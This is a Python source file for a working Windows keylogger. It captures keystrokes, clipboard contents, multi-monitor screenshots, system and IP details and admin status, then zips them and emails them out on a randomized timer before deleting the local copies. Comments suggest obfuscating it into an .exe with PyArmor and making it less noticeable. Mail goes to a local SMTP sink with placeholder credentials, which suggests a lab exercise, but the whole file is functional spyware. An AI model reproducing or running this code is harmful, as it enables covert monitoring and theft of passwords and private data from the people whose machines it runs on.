import ctypes
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# import system information
import getpass
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
import random
# import library for multiple monitor screenshots:
from mss import mss
from email.mime.multipart import MIMEMultipart 
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText

# import regex library
import re
import os
# import wmi to do the command to get # of monitors:
import wmi
import pythoncom
# using 'zipfile' instead of pyminizip because of compatibility issues w/pyminizip
# import pyminizip
import zipfile
# import system info stuff
import socket
import platform
from requests import get
# import clipboard data stuff
import win32clipboard
# import to add files to an array
from os.path import isfile, join, basename

# SET REPORT INTERVAL, EMAIL ADDRESS, EMAIL PASSWORD (EMAIL_PW), and zip PASSWORD BEFORE COMPILING INTO .EXE W/PYARMOR
RPRT_INT = random.randint(10,15)
# set SENDER email address, set to arbitrary email address by default
EMAIL_ADDR = "will@jumanji.org"
# set to arbitrary password by default
EMAIL_PW = "password123"

# commented out PASSWORD variable since this version does                                                                      not use password-protected .zip
# the password used to zip/unzip the .zip containing logs / pictures / etc.
# PASSWORD = "homunculus77"

# Details for the local SMTP Server
SMTP_IP = "localhost"
SMTP_PORT = "1130"
# https://github.com/Nilhcem/FakeSMTP is one choice for a local SMTP server that will store emails in specified directory

# subject of emails - STATUS REPORT
STATUS_UPDATE = f"STATUS REPORT: {datetime.now().strftime('%b %d %Y %X')}"
# REPORT METHOD --> set to "email" for keystrokes/etc sent to email address, or "file" to print keystrokes to log file
RPRT_METHOD = "mail-server"

# CREATE NEW DIR used for zip (logfiles) in current directory
# we could add a mode to make this less likely to be noticed or change the directory the new folder is created in
LOG_DIR = "logfiles"
PATH_EXTEND = join(os.curdir, LOG_DIR)
# PATH_EXTEND= join(PATH + "\\")

# os.mkdir(LOG_DIR) if (not dir(LOG_DIR)) else print("Directory '% s' already exists" % LOG_DIR)

if os.path.isdir(PATH_EXTEND):
    print(f"Directory {LOG_DIR} already exists")
else:
    os.mkdir(LOG_DIR)

# CREATE VARIABLE FOR THE SYSTEM INFORMATION
SYSTEM_INFO = "system_information.txt"
# CREATE VARIABLE FOR CLIPBOARD DATA
CLIPBOARD = "clipboard_data.txt"

# CREATE VARIABLE FOR THE ZIP FILE
ZIP_FILE = "output.zip"
    
class Keylogger:
    def __init__(self, interval, report_method="mail-server"):
        self.interval = interval
        self.report_method = report_method
        # status report message:
        self.status_report = STATUS_UPDATE
        # self.log starts as empty string - will contain user's keystrokes:
        self.log = ""


    def callback(self, event):
        # callback is invoked whenever a keyboard event occurs - i.e. key is released
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == "backspace":
                name = "[<--]"
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # then, add key to self.log
        self.log += name
        

    # skipping the .zip file
    def zip_logs(self):

        with zipfile.ZipFile("output.zip", 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in os.listdir('logfiles'):
                zipf.write(join(LOG_DIR,file))
        
        
    def update_filename(self):
        print("DEBUG: Beginning of update_filename()")
        # generate filename for log file (if being created)
        self.filename = f"topsecret_log--{self.start_time}.log" # took end time out of this since the end time variable is generated milliseconds after the start time

    # this is the report_to_file() function from demo
    def create_logfile(self):
        # this method creates the log file, saving it into specified directory, the logfiles dir
        # open/create new txt file:

        with open(join(LOG_DIR, self.filename), "w") as keystrokes:
            keystrokes.write(self.log)
        keystrokes.close()
        # DEBUGGING:
        print(f"[+] Saved {self.filename} file to {LOG_DIR} directory")


    ######## CHECKING WHETHER USER RUNNING EXE IS ADMINISTRATOR ########
    def check_admin(self):
        print("DEBUG: Checking user's admin status (check_admin())")
        with open(join(PATH_EXTEND, SYSTEM_INFO), 'w') as f:
            try:
                is_admin = os.getuid() == 0
                
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

            f.write(f"Target admin status: {is_admin}\n")
        f.close()

    ######## GETTING SYSTEM INFORMATION ########
    def grab_system_info(self):
        print("[**] DEBUG: grab_system_info()")
        with open(join(PATH_EXTEND, SYSTEM_INFO), 'w') as f:
            hostname =socket.gethostname()
            IP_addr = socket.gethostbyname(hostname)
            f.write("Username: " + getpass.getuser() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            try:
                pub_ip = get('http://api.ipify.org').text
                f.write("Public IP Address: " + pub_ip + '\n')
            except Exception:
                f.write("Could not get Public IP Address" + '\n')
            f.write("Private IP Address: " + IP_addr + '\n')
        f.close()

    ######## GETTING CLIPBOARD DATA #########
    def grab_clipbrd_info(self):
        print("[**] DEBUG: Grabbing clipboard data...")
        with open(join(PATH_EXTEND, CLIPBOARD), 'w') as f:
            try:
                win32clipboard.OpenClipboard()
                paste_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Paste from Clipboard: \n" + paste_data)
            except:
                f.write("Clipboard data could not be collected")
        f.close()

    # function to send a basic email w/recorded keystrokes to a local SMTP server 
    def send_basic_log_smtp(self):
        print("[**] DEBUG: sending basic email to local SMTP server")
        if self.log:
            # record the end time:
            self.end_time = datetime.now()
            self.end_time = self.end_time.strftime("%c")[4:]
            self.end_time = self.end_time.replace("  ", " ").replace(" ", "_").replace(":", ".").replace("_", "", 1)
            # update the file name - if using the report to file method:
            self.update_filename()

            pythoncom.CoInitialize()
            # get # of monitors:
            obj = wmi.WMI().Win32_PnPEntity(ConfigManagerErrorCode=0)
            displays = [x for x in obj if 'DISPLAY' in str(x)]

            num_monitors = len(displays)

            # take screenshots:
            try:
                for i in range(1,num_monitors):
                    mss().shot(mon=i, output=f".\\logfiles\\monitor-{i}.png", callback=None)
            except:
                pass

            self.create_logfile()

            # the method is going to be 'test-mail' - no other methods for this function
            self.grab_clipbrd_info()
            self.zip_logs()

            # reset start time
            self.start_time = datetime.now()
            self.start_time = self.start_time.strftime("%c")[4:]
            self.start_time = self.start_time.replace("  ", " ").replace(" ", "_").replace(":", ".").replace("_", "", 1)

            # redefine self.interval as random time 50-70:
            self.interval = random.randint(10, 15)


            if self.report_method == "mail-server":
                # email details
                sender = EMAIL_ADDR
                receiver = "test@receiver.com"

                msg = MIMEMultipart()
                msg['From'] = sender
                msg['To'] = receiver
                # redefine status report right before adding it to the email:
                self.status_report = f"STATUS REPORT: {datetime.now().strftime('%b %d %Y %X')}"
                msg['Subject'] = self.status_report

                print("[**] DEBUG: Attaching keystroke log as text...")
                # attach keystroke log as a plaintext message
                msg.attach(MIMEText(self.log, 'plain'))

                print("[**] DEBUG: Attaching the .zip...")
                # Attach the zip:
                with open("output.zip", 'rb') as file:
                    msg.attach(MIMEApplication(file.read(), name = "output.zip"))
                file.close()


                try:
                    print("[**] DEBUG: Trying to send email >>>")
                    # port set to 1130 for SMTP sink - HTTP web server for sink will be on port 8080
                    # you *could* set it to a different smtp server, for which you may have to use some form of authentication, etc.
                    smtpObj = smtplib.SMTP('localhost:1130')
                    smtpObj.sendmail(sender, receiver, msg.as_string())
                    print("[**] DEBUG: Succesfully sent mail")

                except smtplib.SMTPException:
                    print("Error - unable to send email")


        else:
            print("[**] DEBUG: Nothing in the keystroke log at this time.")

        timer = Timer(self.interval, function=self.send_basic_log_smtp)
        timer.daemon = True
        timer.start()

        # other way to delete files (should be smaller)
        onlyfiles = [i for i in os.listdir(PATH_EXTEND) if isfile(join(PATH_EXTEND, i))]
        for file in onlyfiles:
            os.remove(join(PATH_EXTEND, file))
        
        print(f"[**] DEBUG: Current directory contents: {os.listdir(PATH_EXTEND)}")
        print("[**] DEBUG: (the above line should say NO CONTENTS - except the stuff that should be in there!)")

    # the method that calls the on_release() method:
    def start(self):
        self.start_time = datetime.now()
        self.start_time = self.start_time.strftime("%c")[4:]
        self.start_time = self.start_time.replace("  ", " ").replace(" ", "_").replace(":", ".").replace("_", "", 1)

        keyboard.on_release(callback=self.callback)

        # start reporting the keylogs:
        # self.beacon_email()
        self.send_basic_log_smtp()
        # DEBUGGING MESSAGE - ASCII pikachu i found..:
        print("""
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠋⠉⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠴⠒⠊⠉⠉⠀⠀⣿⣿⣿⠿⠋⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢀⡠⠼⠴⠒⠒⠒⠒⠦⠤⠤⣄⣀⠀⢀⣠⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⣼⠿⠋⠁⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠀⣇⠔⠂⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⢰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⢀⡟⠀⣠⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⡤⠤⢴
                    ⠀⠀⠀⠀⠀⠀⣸⠁⣾⣿⣀⣽⡆⠀⠀⠀⠀⠀⠀⠀⢠⣾⠉⢿⣦⠀⠀⠀⢸⡀⠀⠀⢀⣠⠤⠔⠒⠋⠉⠉⠀⠀⠀⠀⢀⡞
                    ⠀⠀⠀⠀⠀⢀⡏⠀⠹⠿⠿⠟⠁⠀⠰⠦⠀⠀⠀⠀⠸⣿⣿⣿⡿⠀⠀⠀⢘⡧⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀
                    ⠀⠀⠀⠀⠀⣼⠦⣄⠀⠀⢠⣀⣀⣴⠟⠶⣄⡀⠀⠀⡀⠀⠉⠁⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀
                    ⠀⠀⠀⠀⢰⡇⠀⠈⡇⠀⠀⠸⡾⠁⠀⠀⠀⠉⠉⡏⠀⠀⠀⣠⠖⠉⠓⢤⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀
                    ⠀⠀⠀⠀⠀⢧⣀⡼⠃⠀⠀⠀⢧⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⣧⠀⠀⠀⣸⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠃⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠘⣆⠀⠀⠀⢠⠏⠀⠀⠀⠀⠈⠳⠤⠖⠃⡟⠀⠀⠀⢾⠛⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀⠀⠈⠦⣀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠙⢦⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⢠⡇⠙⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠋⠸⡇⠈⢳⡀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⠀⡼⣀⠀⠀⠈⠙⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⣷⠴⠚⠁⠀⣀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠀⠀⠀⡴⠁⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣆⡴⠚⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⣼⢷⡆⠀⣠⡴⠧⣄⣇⠀⠀⠀⠀⠀⠀⠀⢲⠀⡟⠀⠀⠀⠀⠀⠀⠀⢀⡇⣠⣽⢦⣄⢀⣴⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⡿⣼⣽⡞⠁⠀⠀⠀⢹⡀⠀⠀⠀⠀⠀⠀⠈⣷⠃⠀⠀⠀⠀⠀⠀⠀⣼⠉⠁⠀⠀⢠⢟⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⣷⠉⠁⢳⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⣻⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠏⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠹⡆⠀⠈⡇⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⢳⡀⠀⠙⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⢀⡄⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⢳⡀⣰⣀⣀⣀⠀⠀⠀⠘⣦⣀⠀⠀⠀⡇⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⢸⡇⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                    ⠀⠀⠀⠉⠉⠀⠀⠈⠉⠉⠉⠙⠻⠿⠾⠾⠻⠓⢦⠦⡶⡶⠿⠛⠛⠓⠒⠒⠚⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
            """)
        print(f"[**] DEBUG: {datetime.now()} - KEYLOGGER STARTED --->")
        # block the current thread, wait until CTRL+C is pressed:
        keyboard.wait()

if __name__ == "__main__":
    klgger = Keylogger(RPRT_INT, report_method=RPRT_METHOD)
    # check if current user is an Administrator
    klgger.check_admin()
    # GET SYSTEM INFO - ONCE At beginning of program, same with clipboard info:
    klgger.grab_system_info()
    klgger.grab_clipbrd_info()
    # start() is the esential method since that starts the process
    klgger.start()
